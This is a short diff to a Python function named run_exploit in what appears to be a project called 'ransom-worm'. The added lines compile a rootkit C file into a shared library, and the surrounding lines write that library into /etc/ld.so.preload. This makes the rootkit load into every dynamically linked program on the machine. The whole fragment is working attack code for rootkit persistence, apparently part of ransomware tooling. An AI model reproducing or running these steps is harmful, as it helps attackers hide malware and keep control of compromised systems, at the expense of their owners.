@@ -97,6 +97,10 @@ def run_exploit(exploit):
             run_command(process, "touch /etc/ld.so.preload \n")
             run_command(
                 process,
+                "gcc -fPIC -shared ./utils/rootkit.c -o ./utils/rootkit.so -ldl \n",
+            )
+            run_command(
+                process,
                 "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
             )
             run_command(process, 'echo "exit" \n')
